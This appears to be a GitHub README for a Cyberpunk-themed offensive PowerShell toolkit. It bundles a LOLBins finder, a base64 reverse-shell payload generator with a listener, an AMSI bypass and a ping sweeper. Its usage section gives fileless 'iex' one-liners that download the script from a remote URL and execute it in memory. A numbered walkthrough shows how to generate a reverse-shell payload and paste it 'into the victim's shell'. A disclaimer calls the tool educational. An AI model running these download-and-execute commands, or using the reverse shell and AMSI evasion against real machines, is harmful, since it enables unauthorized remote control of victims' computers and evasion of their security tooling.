<div align="center" style="display:flex;">
  <img src="https://github.com/h0ru/antiarasaka/assets/117091833/c5e7af4a-d7b7-484e-be27-ea9fbed97749" width="800">
</div>

- - - 

> [!Warning]
> **This program was written and designed for educational purposes, with features associated with the world of Cyberpunk 2077.** \
> **The project's author does not take responsibility for any use of the tool and maintains its use strictly for educational purposes.**

- - -

> [!NOTE] 
> **This project explores ideas that have already been developed in my previous projects, but it was created to optimize and also motivate me to create something larger.**\
> **Being a fan of the Cyberpunk 2077 story, I sought inspiration in "something" that could counter Arasaka. So here is the idea: AntiArasaka T00l K1t.**

- - -

### What will you find here?

```
aka.ps1
├──AntiArasaka-Alias               # Similar to Get-Alias
├──AntiArasaka-Help                # Similar to Get-Help
├──LOLBins Finder             
|  └──AntiArasaka-Binaries         # Based on LOLBAS Projetct
├──Generator RevShell & Listener           
|  ├──AntiArasaka-Listener         # Native powershell listener
|  └──AntiArasaka-Payload          # PowerShell paylaod base64 encoded
├──AMSI-Reaper
|  └──AntiArasaka-Reaper           # Based on my project AMSI-Reaper
└──PSWEEPX
   └──AntiArasaka-Sweep            # Based on my project PSWEEPX from icmp-quickhacks
```

- - -

### How to use?

> [!TIP]
> #### _Less DISK, more RAM_
```
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/h0ru/antiarasaka/main/aka/aka.ps1')
```
```
iex (iwr https://raw.githubusercontent.com/h0ru/antiarasaka/main/aka/aka.ps1)
```
```
iex (irm https://raw.githubusercontent.com/h0ru/antiarasaka/main/aka/aka.ps1)
```

> [!TIP]
> #### _Use the aliases_
```
        Command                          Alias
        -------                          ------
        AntiArasaka-Alias          ->     aaa
        AntiArasaka-Help           ->     aah
        AntiArasaka-Binaries       ->     aab
        AntiArasaka-Listener       ->     aal
        AntiArasaka-Payload        ->     aap
        AntiArasaka-Reaper         ->     aar
        AntiArasaka-Sweep          ->     aas
```

> [!TIP]
> #### _What is the purpose of the AntiArasaka-Binaries?_
- Based on the concept of the 198 exploits cataloged at: https://lolbas-project.github.io, I wanted to create a small validator using PowerShell, just a way to verify what we have in the current system that can be used as LOLBINS.
- Good references to LOLBINS: [The LOLBAS Project](https://mitre-attack.github.io/attack-navigator/#layerURL=https://lolbas-project.github.io/mitre_attack_navigator_layer.json)
- How to use AntiArasaka-Binarie.:
```
AntiArasaka-Binarie
AntiArasaka-Binarie -Filter .exe, .dll, .ps1
AntiArasaka-Binarie -Filter .vbs
AntiArasaka-Binarie -Name cmd.exe
AntiArasaka-Binarie -Name .bat
AntiArasaka-Binarie -Name winrm.vbs
```

> [!TIP]
> #### _How to use AntiArasaka-Listener & AntiArasaka-Payload_
- Attention to these errors:
![image](https://github.com/h0ru/antiarasaka/assets/117091833/63e1ed73-2629-4a2d-87a0-ec7b388d5e34)
![image](https://github.com/h0ru/antiarasaka/assets/117091833/75af46c3-5875-4986-8a73-32b1e849fc49)
```
1. aap -i 192.168.1.1 -p 443 #Payload
2. [+] Payload copied to clipboard! Use Ctrl+V to paste and execute.
3. aal -i 192.168.1.3 -p 443 #Listener
4. Paste your payload into the victim's shell (Consider hosting the shell on a file and requesting it remotely)
```

- - -

> [!IMPORTANT]
> - [❗] More updates will come and Anti-Arasaka will have more features!
> - [❗] Did you like the idea and the work? Show your support with a ⭐ to stay updated.
> - [❗] If you're interested in helping or sharing your opinion, reach out to me through public channels or on Discord at **ph4nt0m.zip**.

- - - 
